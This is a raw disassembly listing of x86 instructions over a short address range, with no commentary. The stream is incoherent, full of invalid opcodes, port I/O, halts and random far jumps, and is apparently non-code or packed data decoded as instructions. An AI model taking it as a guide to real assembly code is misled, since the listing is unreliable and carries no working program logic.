  411f9b:	in     al,0x89
  411f9d:	ret    0x62b7
  411fa0:	jne    0x411f82
  411fa2:	mov    dl,0xac
  411fa4:	jg     0x411f83
  411fa6:	ret    0xc5cb
  411fa9:	pop    esp
  411faa:	mov    ah,0x6c
  411fac:	xchg   ebp,eax
  411fad:	popf   
  411fae:	arpl   WORD PTR [ebp-0x6c],bp
  411fb1:	mov    eax,ds:0xccf3637c
  411fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fb7:	lods   eax,DWORD PTR ds:[esi]
  411fb8:	add    bl,BYTE PTR [esi-0x7c]
  411fbb:	and    DWORD PTR [bp+si-0x7a50],0xc2cad3bc
  411fc4:	cdq    
  411fc5:	mov    esp,DWORD PTR [eax+0x5e]
  411fc8:	fcom   QWORD PTR [ebx]
  411fca:	daa    
  411fcb:	or     ecx,DWORD PTR [ecx+eiz*2+0x5bd39bc4]
  411fd2:	or     al,0xf6
  411fd4:	sub    dl,dl
  411fd6:	les    esp,FWORD PTR [edx+0xdd29cd7]
  411fdc:	(bad)  [edi]
  411fde:	inc    ecx
  411fdf:	xchg   ebx,eax
  411fe0:	mov    edi,0xd498c535
  411fe5:	or     esi,DWORD PTR ds:0xe1ac059
  411feb:	mov    ah,0x68
  411fed:	mov    eax,ds:0xb93d4d5e
  411ff2:	xchg   ebx,eax
  411ff3:	sub    eax,0xb6e3fd3a
  411ff8:	cmc    
  411ff9:	cmp    al,0xf5
  411ffb:	jmp    0x41200a
  411ffd:	mov    BYTE PTR [eax],dh
  411fff:	sbb    al,0x58
  412001:	adc    al,0xcf
  412003:	cmp    BYTE PTR [edi+0x77e9b6ef],al
  412009:	test   al,0x56
  41200b:	cwde   
  41200c:	jne    0x411fe0
  41200e:	mov    bh,0xcb
  412010:	not    bl
  412012:	sub    DWORD PTR [esi+0x4293ba9a],esi
  412018:	mov    esp,0x74053f64
  41201d:	adc    DWORD PTR [esi+ebp*1],ebx
  412020:	loope  0x411fc1
  412022:	retf   
  412023:	fdiv   st(2),st
  412025:	inc    ebp
  412026:	and    cl,BYTE PTR [esi]
  412028:	pop    esp
  412029:	dec    ebp
  41202a:	adc    cl,dh
  41202c:	daa    
  41202d:	jecxz  0x412059
  41202f:	lods   eax,DWORD PTR ds:[esi]
  412030:	dec    ebx
  412031:	sbb    eax,0x296c2b7a
  412036:	loopne 0x411fdb
  412038:	pop    ebx
  412039:	fwait
  41203a:	cmp    DWORD PTR [ebp+0x22],eax
  41203d:	mov    ?,WORD PTR [eax+0x45]
  412040:	and    BYTE PTR [ecx+0x5c4adbbd],0x83
  412047:	and    esi,DWORD PTR [edx-0x3e7364dc]
  41204d:	mov    ds,WORD PTR [ecx]
  41204f:	fld    DWORD PTR [ebx+0x6ac1953b]
  412055:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  412057:	adc    BYTE PTR [esi+0x0],bh
  41205a:	sub    DWORD PTR [edx-0x2b100f7d],ebx
  412060:	cld    
  412061:	inc    edx
  412062:	in     eax,dx
  412063:	shl    BYTE PTR [esi],0x82
  412066:	or     eax,0xcf730a5a
  41206b:	mov    bh,0xc5
  41206d:	mov    al,0xbe
  41206f:	sbb    eax,0x24f5c339
  412074:	ror    BYTE PTR [ebp+ebx*1-0x2f],1
  412078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412079:	jno    0x412046
  41207b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207c:	cmp    al,0xd4
  41207e:	jno    0x4120f8
  412080:	fbld   TBYTE PTR [edi]
  412082:	xchg   esi,eax
  412083:	xchg   ebx,eax
  412084:	adc    eax,0x4560cec2
  412089:	mov    ds:0x55a7ce22,al
  41208e:	dec    esi
  41208f:	out    dx,al
  412090:	sub    al,0xaa
  412092:	sbb    DWORD PTR [ecx+0x7d],esi
  412095:	call   0x368e:0xc54ee743
  41209c:	sahf   
  41209d:	sub    eax,0x5bd20c60
  4120a2:	cmp    eax,0x55fa3b4f
  4120a7:	shl    DWORD PTR [ebp-0x3db5bbfd],1
  4120ad:	and    DWORD PTR [ecx+eiz*8],ebp
  4120b0:	stos   BYTE PTR es:[edi],al
  4120b1:	xchg   ebx,eax
  4120b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120b3:	inc    edi
  4120b4:	es sahf 
  4120b6:	mov    al,ds:0x14e3619f
  4120bb:	jmp    0xc5b9:0x91a97dc3
  4120c2:	sbb    edi,ecx
  4120c4:	xor    DWORD PTR [ebp+0x78],esi
  4120c7:	lods   eax,DWORD PTR ds:[esi]
  4120c8:	push   ds
  4120c9:	pop    es
  4120ca:	adc    ebx,DWORD PTR [ebx]
  4120cc:	shl    BYTE PTR [edx-0x1a],0xcd
  4120d0:	or     al,0xcd
  4120d2:	mov    dh,0x91
  4120d4:	mov    ds:0x64af54c5,al
  4120d9:	pop    ds
  4120da:	in     al,dx
  4120db:	inc    edi
  4120dc:	outs   dx,BYTE PTR ds:[esi]
  4120dd:	mov    dh,0x2f
  4120df:	retf   0xc2d9
  4120e2:	aas    
  4120e3:	sub    BYTE PTR [edi],0x15
  4120e6:	mov    dl,BYTE PTR [ebx+esi*1]
  4120e9:	push   ecx
  4120ea:	cdq    
  4120eb:	jle    0x412104
  4120ed:	pushf  
  4120ee:	not    DWORD PTR [edx-0x33]
  4120f1:	jno    0x412172
  4120f3:	jp     0x412077
  4120f5:	mov    WORD PTR [ecx+0x1d],ds
  4120f8:	dec    ebx
  4120f9:	push   0x6a
  4120fb:	mov    eax,ds:0x7a74efad
  412100:	daa    
  412101:	loopne 0x4120fc
  412103:	hlt    
  412104:	repnz mov ebx,0x2835dffa
  41210a:	lock cmp ebp,0x9ee9f66e
  412111:	pop    edi
  412112:	hlt    
  412113:	fdivr  DWORD PTR [esi-0x5ab42f54]
  412119:	les    edx,FWORD PTR [edi-0xf]
  41211c:	nop
  41211d:	push   esp
  41211e:	or     al,0x40
  412120:	pop    esi
  412121:	aaa    
  412122:	retf   0xca8f
  412125:	mov    dl,0x1c
  412127:	lea    ebx,[eax]
  412129:	popf   
  41212a:	push   ss
  41212b:	sub    DWORD PTR gs:[ebx+0x5],edi
  41212f:	into   
  412130:	push   edx
  412131:	or     al,0x15
  412133:	fld1   
  412135:	xor    dl,dh
  412137:	repnz push 0xffffffce
  41213a:	loop   0x41215e
  41213c:	ja     0x4120c2
  41213e:	icebp  
  41213f:	pop    ds
  412140:	push   edi
  412141:	and    BYTE PTR [edx+0x1341f760],dh
  412147:	lods   al,BYTE PTR ds:[esi]
  412148:	lock sar BYTE PTR [ebp+0x44d69894],cl
  41214f:	enter  0x229,0x43
  412153:	xchg   esi,eax
  412154:	in     eax,0x6
  412156:	push   edx
  412157:	sbb    eax,0x46e63b7
  41215c:	cmp    DWORD PTR [ebx+edi*8-0x4b81b155],ebp
  412163:	add    cl,BYTE PTR [ebx-0x36]
  412166:	mov    esp,0x478ca8e6
  41216b:	sub    al,0x10
  41216d:	xlat   BYTE PTR ds:[ebx]
  41216e:	stos   DWORD PTR es:[edi],eax
  41216f:	and    DWORD PTR [ebp-0x48ded1f2],edx
  412175:	inc    ebx
  412176:	loope  0x4121f3
  412178:	and    eax,0x910e18eb
  41217d:	gs ins DWORD PTR es:[edi],dx
  41217f:	sbb    DWORD PTR [esi-0x37451687],edx
  412185:	dec    ebp
  412186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412187:	pushf  
  412188:	je     0x412193
  41218a:	sbb    eax,DWORD PTR [edi-0x53]
  41218d:	dec    ebx
  41218e:	jmp    0x3eca:0x84ebec30
  412195:	ds or  al,0xdc
  412198:	test   BYTE PTR [eax-0x14a3c4f],ah
  41219e:	repz inc esp
  4121a0:	out    dx,eax
  4121a1:	adc    BYTE PTR [eax+0x4a525407],dl
  4121a7:	mov    ds:0xf83ce59f,al
  4121ac:	push   ds
  4121ad:	imul   ebx,DWORD PTR [ebx],0xffffffe0
  4121b0:	jmp    0x4121b7
  4121b2:	jb     0x412200
  4121b4:	leave  
  4121b5:	sbb    esp,DWORD PTR [esp+edi*8-0x257a0af2]
  4121bc:	popf   
  4121bd:	adc    al,0x64
  4121bf:	lods   al,BYTE PTR ds:[esi]
  4121c0:	out    0xc5,al
  4121c2:	push   esi
  4121c3:	jnp    0x4121b3
  4121c5:	xor    ebp,ebx
  4121c7:	(bad)  
  4121c8:	xchg   edx,eax
  4121c9:	cld    
  4121ca:	in     al,0xf6
  4121cc:	stos   DWORD PTR es:[edi],eax
  4121cd:	imul   eax,ecx,0x58
  4121d0:	sub    dl,BYTE PTR [ebx]
  4121d2:	bnd jg 0x4121c2
  4121d5:	jmp    0x41216e
  4121d7:	or     edx,ebp
  4121d9:	inc    ebx
  4121da:	es mov eax,fs:0x706f6760
  4121e1:	pop    ds
  4121e2:	loop   0x4121a4
  4121e4:	pop    edx
  4121e5:	mov    esp,0xf01c5d8e
  4121ea:	lds    esi,FWORD PTR ds:0x9cf31c0f
  4121f0:	retf   
  4121f1:	and    al,0xe1
  4121f3:	jne    0x412254
  4121f5:	fiadd  DWORD PTR [edi+esi*2-0x739673eb]
  4121fc:	sar    BYTE PTR [eax+esi*2-0x72],1
  412200:	or     ebx,edx
  412202:	sti    
  412203:	icebp  
  412204:	pop    esi
  412205:	js     0x4121d9
  412207:	adc    al,0xf4
  412209:	in     al,0x30
  41220b:	cmp    DWORD PTR [esi+0x41],esi
  41220e:	cs mov ebp,0x42e4090f
  412214:	mov    ecx,0xce5f4381
  412219:	bound  eax,QWORD PTR [ebp+esi*8+0x5a47504e]
  412220:	xchg   esp,eax
  412221:	push   0xe17174a8
  412226:	inc    esp
  412227:	out    0x57,eax
  412229:	into   
  41222a:	and    al,0x9e
  41222c:	inc    ecx
  41222d:	jb     0x41222d
  41222f:	loop   0x412212
  412231:	mov    esi,0xa7ff597
  412236:	cld    
  412237:	inc    ebp
  412238:	daa    
  412239:	adc    eax,0xade46ca5
  41223e:	sti    
  41223f:	sub    al,0x5
  412241:	xor    bh,BYTE PTR [edx]
  412243:	xchg   esp,eax
  412244:	mov    BYTE PTR [esi+edx*2],ch
  412247:	in     eax,dx
  412248:	aaa    
  412249:	mov    gs,WORD PTR [edi+0x5a62c839]
  41224f:	sti    
  412250:	inc    ebp
  412251:	and    al,cl
  412253:	jns    0x4122ad
  412255:	imul   ecx,DWORD PTR [ebp+0x38],0x650c65d6
  41225c:	in     al,0x73
  41225e:	pop    esi
  41225f:	xchg   eax,esp
  412261:	loop   0x4121f5
  412263:	jnp    0x41223b
  412265:	cmp    ebp,DWORD PTR [edx+0x2dc644f3]
  41226b:	lods   eax,DWORD PTR ds:[esi]
  41226c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41226d:	cmp    DWORD PTR [eax+esi*4],edi
  412270:	test   DWORD PTR [edx],esi
  412272:	adc    ebx,edx
  412274:	mov    fs:0xb89c2152,eax
  41227a:	retf   
  41227b:	push   edx
  41227c:	jne    0x41223b
  41227e:	repnz inc BYTE PTR [edi-0x40]
  412282:	and    eax,0x61394690
  412287:	popf   
  412288:	repnz xchg ecx,eax
  41228a:	imul   edx,esi,0xbafd9dae
  412290:	cmp    ah,BYTE PTR [ebx]
  412292:	hlt    
  412293:	jno    0x4122fe
  412295:	and    eax,0xdc54d36a
  41229a:	(bad)  
  41229b:	push   es
  41229c:	cmp    dl,bh
  41229e:	adc    ecx,esi
  4122a0:	cli    
  4122a1:	std    
  4122a2:	or     al,0x67
  4122a4:	lods   eax,DWORD PTR ds:[esi]
  4122a5:	adc    al,BYTE PTR [ebx+0x2382460b]
  4122ab:	jne    0x412318
  4122ad:	mov    ds:0x7ec8f8a9,al
  4122b2:	and    DWORD PTR [ebp+0x21],0x38
  4122b6:	jno    0x412300
  4122b8:	fwait
  4122b9:	jne    0x412312
  4122bb:	sub    edi,DWORD PTR [eax+0x60]
  4122be:	cmp    al,0xca
  4122c0:	mov    bh,0x70
  4122c2:	and    al,0xa0
  4122c4:	sub    al,BYTE PTR [ecx-0x75]
  4122c7:	and    BYTE PTR [ecx+0x1f],bh
  4122ca:	add    BYTE PTR [edx-0x199a25dc],dl
  4122d0:	or     DWORD PTR [esi],edx
  4122d2:	sbb    DWORD PTR [ebp-0x54],0xe9b7139a
  4122d9:	pop    es
  4122da:	push   ds
  4122db:	jbe    0x412317
  4122dd:	xor    DWORD PTR [esi],eax
  4122df:	retf   
  4122e0:	jbe    0x4122d1
  4122e2:	test   DWORD PTR [esi],ebx
  4122e4:	mov    ebp,0x359bcee7
  4122e9:	test   BYTE PTR [eax+0x4d581057],al
  4122ef:	mov    BYTE PTR [ecx],ch
  4122f1:	repnz into 
  4122f3:	sahf   
  4122f4:	mov    esi,0x8bcef0d
  4122f9:	mov    al,0xa2
  4122fb:	scas   al,BYTE PTR es:[edi]
  4122fc:	push   esi
  4122fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122fe:	fld    TBYTE PTR [ecx]
  412300:	out    0x6c,eax
  412302:	jle    0x4122b6
  412304:	and    dl,ah
  412306:	stos   DWORD PTR es:[di],eax
  412308:	sbb    eax,0xa17d229c
  41230d:	pop    eax
  41230e:	out    0x86,al
  412310:	imul   esi,ebp,0xffffffc6
  412313:	jg     0x4122a9
  412315:	ret    0x2ddd
  412318:	adc    eax,DWORD PTR [ebx-0x6f]
  41231b:	nop
  41231c:	mov    ch,0x9e
  41231e:	pop    edx
  41231f:	sti    
  412320:	out    0xd0,al
  412322:	fwait
  412323:	pop    ss
  412324:	aam    0x9
  412326:	and    DWORD PTR [ecx-0x49],ebx
  412329:	test   DWORD PTR [eax-0x5470f603],edx
  41232f:	cmp    DWORD PTR [edx+eax*4+0x29],esi
  412333:	int    0x2f
  412335:	sti    
  412336:	pop    ebp
  412337:	test   esp,esp
  412339:	or     BYTE PTR [edx-0x756bbb78],ah
  41233f:	dec    eax
  412340:	lds    edi,FWORD PTR [edi-0x4f]
  412343:	(bad)  
  412344:	clc    
  412345:	sbb    eax,0x6f423e77
  41234a:	jne    0x412316
  41234c:	sbb    BYTE PTR [eax],dh
  41234e:	jle    0x412354
  412350:	mov    eax,0x2ad12ac1
  412355:	ret    
  412356:	bound  edi,QWORD PTR [eax-0x29]
  412359:	stc    
  41235a:	loope  0x41230e
  41235c:	test   BYTE PTR [ebp+0x49ee595d],bh
  412362:	test   edi,ebx
  412364:	xchg   esi,eax
  412365:	sub    eax,DWORD PTR [esi-0x52]
  412368:	jns    0x412342
  41236a:	in     eax,0x53
  41236c:	rcl    DWORD PTR [edi],1
  41236e:	adc    ah,dl
  412370:	outs   dx,BYTE PTR ds:[esi]
  412371:	test   ch,cl
  412373:	nop
  412374:	in     al,dx
  412375:	pop    ecx
  412376:	ins    DWORD PTR es:[edi],dx
  412377:	pusha  
  412378:	inc    esi
  412379:	xchg   esp,eax
  41237a:	mov    al,0x1a
  41237c:	mov    edi,ds
  41237e:	jle    0x4123e3
  412380:	sbb    edi,esp
  412382:	mov    cl,bh
  412384:	call   0xb05c:0x9549ac3
  41238b:	loopne 0x412310
  41238d:	dec    eax
  41238e:	into   
  41238f:	test   eax,0xb0dc095c
  412394:	cwde   
  412395:	mov    al,ds:0xdc24f366
  41239a:	js     0x41235a
  41239c:	and    BYTE PTR [eax-0x3e],dh
  41239f:	jl     0x41236e
  4123a1:	adc    dl,bh
  4123a3:	sub    dl,BYTE PTR [ebx+ecx*8+0x1b]
  4123a7:	push   cs
  4123a8:	loope  0x412409
  4123aa:	retf   
  4123ab:	xchg   ebp,eax
  4123ac:	rcl    BYTE PTR [ecx],1
  4123ae:	jp     0x412370
  4123b0:	jne    0x4123fe
  4123b2:	xor    BYTE PTR [ebp+0x46],cl
  4123b5:	dec    esp
  4123b6:	aam    0x73
  4123b8:	jg     0x41237c
  4123ba:	sbb    BYTE PTR [esi+0xd7fdd36],0x34
  4123c1:	test   al,0xc4
  4123c3:	sub    BYTE PTR [edx-0x17104316],0x16
  4123ca:	push   ebp
  4123cb:	adc    DWORD PTR [esp+eiz*8+0x49d4edaa],0xffffffb9
  4123d3:	sbb    eax,0xc6c7e5b8
  4123d8:	cwde   
  4123d9:	(bad)  
  4123da:	(bad)  
  4123db:	jns    0x412422
  4123dd:	in     al,dx
  4123de:	rcl    DWORD PTR [esi+0x5f],1
  4123e1:	loop   0x4123f4
  4123e3:	sti    
  4123e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e5:	repnz mov cs,WORD PTR [ebp+0x40]
  4123e9:	repnz fst QWORD PTR [eax+0x6]
  4123ed:	mov    al,0x99
  4123ef:	daa    
  4123f0:	rol    DWORD PTR [edi-0x18],cl
  4123f3:	cmc    
  4123f4:	outs   dx,BYTE PTR ds:[esi]
  4123f5:	(bad)  
  4123f6:	call   0x59772f55
  4123fb:	rcr    DWORD PTR [esi],cl
  4123fd:	mov    ch,0x14
  4123ff:	fiadd  DWORD PTR [ebp+ebx*8-0x6c]
  412403:	adc    esp,esi
  412405:	lock fisubr DWORD PTR [ebp-0x7d]
  412409:	bnd js 0x4123d3
  41240c:	and    DWORD PTR [eax+eiz*8-0x50],0xffffff95
  412411:	shl    DWORD PTR [ebp-0x2192e6ec],0x5a
  412418:	retf   0xc282
  41241b:	retf   
  41241c:	es mov esp,0x8758317
  412422:	imul   DWORD PTR [esi+0x1d0a3df4]
  412428:	ins    DWORD PTR es:[edi],dx
  412429:	pop    edx
  41242a:	dec    edi
  41242b:	test   BYTE PTR [eax-0xac7aa6b],cl
  412431:	inc    ebx
  412432:	adc    al,0xd0
  412434:	sbb    bh,BYTE PTR [eax+0x3e]
  412437:	nop
  412438:	or     al,0xd2
  41243a:	sub    DWORD PTR [esi-0x40],edx
  41243d:	jge    0x4123e4
  41243f:	xchg   BYTE PTR ss:[eax+0x930862e],ch
  412446:	xor    edx,0x3d
  412449:	outs   dx,DWORD PTR ds:[esi]
  41244a:	scas   al,BYTE PTR es:[edi]
  41244b:	dec    esp
  41244c:	out    dx,al
  41244d:	dec    eax
  41244e:	sub    DWORD PTR [edx+0x2a],ecx
  412451:	call   0x7ba75591
  412456:	xchg   esi,eax
  412457:	xchg   ebp,eax
  412458:	popa   
  412459:	call   0xd17bd64b
  41245e:	mov    al,ds:0xb26fc86a
  412463:	pop    ss
  412464:	scas   al,BYTE PTR es:[edi]
  412465:	adc    bh,dh
  412467:	xchg   ebx,eax
  412468:	das    
  412469:	sbb    DWORD PTR [esi],esi
  41246b:	in     al,dx
  41246c:	bound  edi,QWORD PTR [edi+edx*8+0x685ec464]
  412473:	jne    0x4124c5
  412475:	bound  ebx,QWORD PTR [ebx-0x362bafac]
  41247b:	pop    es
  41247c:	lds    edx,FWORD PTR [ebx-0xa]
  41247f:	mov    al,ds:0xed9bf740
  412484:	inc    ecx
  412485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412486:	adc    BYTE PTR [edi-0x69],al
  412489:	outs   dx,BYTE PTR ds:[esi]
  41248a:	mov    eax,ds:0xce448461
  41248f:	cmp    ebx,DWORD PTR ds:0x5766ffef
  412495:	call   0x47b53c68
  41249a:	dec    ecx
  41249b:	popa   
  41249c:	push   edx
  41249d:	cmc    
  41249e:	data16 out 0xcb,al
  4124a1:	popf   
  4124a2:	jb     0x4124cb
  4124a4:	loop   0x412490
  4124a6:	stos   BYTE PTR es:[edi],al
  4124a7:	push   ds
  4124a8:	mov    ebx,0x2823f6f
  4124ad:	xor    eax,0x123533bf
  4124b2:	push   ebp
  4124b3:	and    BYTE PTR [edx-0x12],ch
  4124b6:	add    DWORD PTR [eax+0x32ac46c6],ebx
  4124bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124bd:	sbb    DWORD PTR [edi-0x6ddeb052],esi
  4124c3:	push   cs
  4124c4:	dec    edx
  4124c5:	sbb    BYTE PTR [ebx-0x46f3e4ac],dl
  4124cb:	dec    edx
  4124cc:	int    0x2b
  4124ce:	push   esi
  4124cf:	sub    al,0x4f
  4124d1:	push   ds
  4124d2:	nop
  4124d3:	lock or ebx,ebp
  4124d6:	inc    ebp
  4124d7:	and    al,0xba
  4124d9:	int    0x68
  4124db:	pop    ebp
  4124dc:	sbb    bl,BYTE PTR [edx]
  4124de:	adc    eax,0x11af952b
  4124e3:	inc    ebp
  4124e4:	dec    ebp
  4124e5:	cli    
  4124e6:	xchg   ebp,eax
  4124e7:	sbb    BYTE PTR [ecx+0x24],dl
  4124ea:	xor    DWORD PTR [eax],ebx
  4124ec:	fidiv  DWORD PTR [ebx+0x30]
  4124ef:	dec    ecx
  4124f0:	push   ecx
  4124f1:	mov    es,esp
  4124f3:	mov    ch,0x94
  4124f5:	imul   eax,DWORD PTR [edi-0x301433f9],0xffffffc6
  4124fc:	sub    al,0x1f
  4124fe:	jmp    0x51da:0x4f5f709b
  412505:	call   0x68cb:0x2490a444
  41250c:	mov    dh,0x5c
  41250e:	out    0x6b,eax
  412510:	das    
  412511:	sahf   
  412512:	mov    esi,0x67b0f362
  412517:	or     ah,BYTE PTR [esi]
  412519:	push   es
  41251a:	stc    
  41251b:	scas   al,BYTE PTR es:[edi]
  41251c:	pop    eax
  41251d:	jno    0x412590
  41251f:	mov    WORD PTR [edi+0x7f],cs
  412522:	cmp    al,0xe6
  412524:	outs   dx,BYTE PTR ds:[esi]
  412525:	and    dh,dl
  412527:	jle    0x412545
  412529:	fst    DWORD PTR [edx-0x3a]
  41252c:	push   ebp
  41252d:	xchg   edx,eax
  41252e:	mov    BYTE PTR [edi],ah
  412530:	ror    ebx,0x76
  412533:	les    edi,FWORD PTR [edx-0x54afe73b]
  412539:	xlat   BYTE PTR ds:[ebx]
  41253a:	mov    ds:0xc9efc5de,eax
  41253f:	hlt    
  412540:	xor    al,0x4f
  412542:	(bad)  
  412543:	fsub   QWORD PTR [ecx+esi*4-0x3b23aac1]
  41254a:	adc    BYTE PTR [edi-0x4b],ah
  41254d:	jo     0x412554
  41254f:	mov    bh,0x27
  412551:	cmp    dl,ah
  412553:	lahf   
  412554:	sbb    BYTE PTR [edx+0x32],bl
  412557:	aaa    
  412558:	fwait
  412559:	(bad)  
  41255a:	in     eax,dx
  41255b:	mov    edx,0xe90039ef
  412560:	js     0x4124ee
  412562:	mov    cl,0xfd
  412564:	cs jmp 0xd928:0xbe5515fa
  41256c:	jo     0x412552
  41256e:	(bad)  
  41256f:	pop    ds
  412570:	pop    ebx
  412571:	test   BYTE PTR [ebx],al
  412573:	sub    DWORD PTR [ebx+0x4be9c3e5],eax
  412579:	inc    edx
  41257a:	ret    0x7e86
  41257d:	int3   
  41257e:	mov    ds:0xb20bc5f3,al
  412583:	jle    0x4125fa
  412585:	fwait
  412586:	mov    ebx,gs
  412588:	stos   DWORD PTR es:[edi],eax
  412589:	cmp    eax,0xa1bffbe
  41258e:	jp     0x4125f1
  412590:	(bad)  
  412591:	retf   0x6889
  412594:	push   edx
  412595:	imul   esi,DWORD PTR [edx],0xffffffb7
  412598:	jae    0x412597
  41259a:	dec    ecx
  41259b:	mov    ch,0x94
  41259d:	(bad)  
  41259e:	test   ebx,0x7f6c754
  4125a4:	inc    ebp
  4125a5:	call   0x4419:0x9f93d74f
  4125ac:	clc    
  4125ad:	loopne 0x412579
  4125af:	or     eax,0xe9d00466
  4125b4:	out    dx,al
  4125b5:	jbe    0x412551
  4125b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b8:	(bad)  
  4125b9:	dec    ebp
  4125ba:	je     0x41256d
  4125bc:	rcr    esi,0x40
  4125bf:	push   cs
  4125c0:	fnstcw WORD PTR [ebp-0x27c64bfb]
  4125c6:	mov    ah,0x39
  4125c8:	rcr    BYTE PTR [esi-0x2dffcbb3],1
  4125ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125cf:	pushf  
  4125d0:	ds push ebx
  4125d2:	push   cs
  4125d3:	cmp    esi,DWORD PTR [eax]
  4125d5:	(bad)  
  4125d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125d7:	mov    al,0x6c
  4125d9:	sbb    eax,0x2bee6d51
  4125de:	push   ds
  4125df:	xchg   ecx,eax
  4125e0:	or     al,0xe
  4125e2:	and    al,0x8e
  4125e4:	fmul   DWORD PTR [edx+0x67e02c39]
  4125ea:	mov    ecx,0x9f3cdd32
  4125ef:	int    0x2f
  4125f1:	stos   BYTE PTR es:[edi],al
  4125f2:	push   0x45
  4125f4:	adc    eax,DWORD PTR [esi]
  4125f6:	int    0xc0
  4125f8:	inc    esi
  4125f9:	inc    ebp
  4125fa:	test   BYTE PTR [eax],dl
  4125fc:	jno    0x4125db
  4125fe:	lds    ecx,FWORD PTR [eax]
  412600:	jmp    0xbc7e:0x8cf312ce
  412607:	loope  0x412667
  412609:	retf   0xfcd2
  41260c:	xor    ch,ah
  41260e:	pop    edi
  41260f:	push   esi
  412610:	xchg   edx,eax
  412612:	stc    
  412613:	in     eax,dx
  412614:	sub    eax,0xf225b3f8
  412619:	lahf   
  41261a:	jle    0x412612
  41261c:	xor    esi,edx
  41261e:	or     eax,0x8fc01f83
  412623:	ins    BYTE PTR es:[edi],dx
  412624:	js     0x41265b
  412626:	pop    esp
  412627:	dec    esp
  412628:	cli    
  412629:	out    dx,eax
  41262a:	scas   eax,DWORD PTR es:[edi]
  41262b:	in     eax,0x85
  41262d:	dec    eax
  41262e:	stos   BYTE PTR es:[edi],al
  41262f:	and    al,0x75
  412631:	pop    eax
  412632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412633:	push   edi
  412634:	das    
  412635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412636:	pop    ds
  412637:	mov    edx,0x3398c0b1
  41263c:	push   ebx
  41263d:	aam    0xc1
  41263f:	mov    al,BYTE PTR [ebp+0x30da4d71]
  412645:	sub    ch,BYTE PTR [ecx+0x5e]
  412648:	imul   edi,ecx,0xc74308af
  41264e:	dec    eax
  41264f:	andnps xmm7,XMMWORD PTR [edx-0x2a]
  412653:	dec    ecx
  412654:	mov    edi,0x63b18bcf
  412659:	dec    ecx
  41265a:	mov    bl,0x64
  41265c:	imul   ebx,DWORD PTR [edi],0xffffffa7
  41265f:	cwde   
  412660:	stos   DWORD PTR es:[edi],eax
  412661:	rcr    DWORD PTR [edx+0x58ec8eef],cl
  412667:	call   0x837a:0xf434f121
  41266e:	sbb    BYTE PTR [ebx+0x53],ah
  412671:	cli    
  412672:	mov    edx,0x8643fa90
  412677:	mov    ds:0x69370a18,eax
  41267c:	je     0x41265a
  41267e:	fidiv  DWORD PTR [eax-0x7c]
  412681:	xor    eax,0x8fd82ed3
  412686:	out    0x8,eax
  412688:	cmp    BYTE PTR [ebx-0x2354b883],0x92
  41268f:	inc    edi
  412690:	into   
  412691:	push   es
  412692:	popf   
  412693:	repz dec ebx
  412695:	lea    edx,[ecx-0x45be153e]
  41269b:	cmp    ch,BYTE PTR [edx-0x5c]
  41269e:	ret    
  41269f:	cmova  ebp,DWORD PTR [edx+0x58]
  4126a3:	not    DWORD PTR [esi+ecx*1-0x6c]
  4126a7:	xor    dl,BYTE PTR [ebx]
  4126a9:	pop    esi
  4126aa:	fidivr DWORD PTR [edx]
  4126ac:	icebp  
  4126ad:	mov    eax,0x3c9990fa
  4126b2:	scas   eax,DWORD PTR es:[edi]
  4126b3:	push   ds
  4126b4:	aaa    
  4126b5:	sbb    eax,0x479de43
  4126ba:	in     eax,0x88
  4126bc:	retf   
  4126bd:	mov    dl,0xe3
  4126bf:	ret    
  4126c0:	stos   DWORD PTR es:[edi],eax
  4126c1:	jmp    0x41269b
  4126c3:	ror    DWORD PTR [esp+edi*8],cl
  4126c6:	sar    BYTE PTR [ebp+0x23],0xd5
  4126ca:	jle    0x4126d0
  4126cc:	lock push ebp
  4126ce:	dec    edx
  4126cf:	mov    ebp,ecx
  4126d1:	jne    0x412653
  4126d3:	adc    BYTE PTR [eax],ah
  4126d5:	sbb    cl,cl
  4126d7:	xchg   ecx,eax
  4126d8:	mov    al,0x4a
  4126da:	mov    ds:0x51fa1365,al
  4126df:	push   es
  4126e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126e1:	stc    
  4126e2:	jecxz  0x4126c2
  4126e4:	xor    eax,0xbc852324
  4126e9:	call   0xee1c506e
  4126ee:	or     eax,0x1008c3bf
  4126f3:	mov    ecx,0x85c52512
  4126f8:	pop    eax
  4126f9:	retf   
  4126fa:	add    al,0xae
  4126fc:	iret   
  4126fd:	sbb    bl,0x1b
  412700:	js     0x4126ff
  412702:	push   ss
  412703:	cwde   
  412704:	hlt    
  412705:	pop    ss
  412706:	(bad)  
  412707:	outs   dx,BYTE PTR ds:[esi]
  412708:	xchg   BYTE PTR [ecx],bh
  41270a:	pop    eax
  41270b:	and    DWORD PTR [edx-0x19],0xa6cdc1cb
  412712:	out    0xd6,eax
  412714:	(bad)  
  412715:	gs popf 
  412717:	test   DWORD PTR [ebp+eax*8-0x7a],ebx
  41271b:	fwait
  41271c:	xchg   BYTE PTR [edi+0x1b903779],bh
  412722:	neg    edi
  412724:	cdq    
  412725:	pop    ss
  412726:	mov    eax,ds:0x6e10fac5
  41272b:	test   BYTE PTR [ecx-0x11],al
  41272e:	shl    BYTE PTR [ecx+0x2c],0x48
  412732:	data16 test al,0x22
  412735:	cli    
  412736:	mov    al,ds:0x22198e8b
  41273b:	hlt    
  41273c:	fsub   DWORD PTR [ebp-0x43]
  41273f:	scas   al,BYTE PTR es:[edi]
  412740:	push   ds
  412741:	push   ds
  412742:	lahf   
  412743:	mov    ds:0x6e4a785b,al
  412748:	cmp    eax,0x1afd7fd1
  41274d:	test   al,0x37
  41274f:	sub    ebx,DWORD PTR [ebx+0x9]
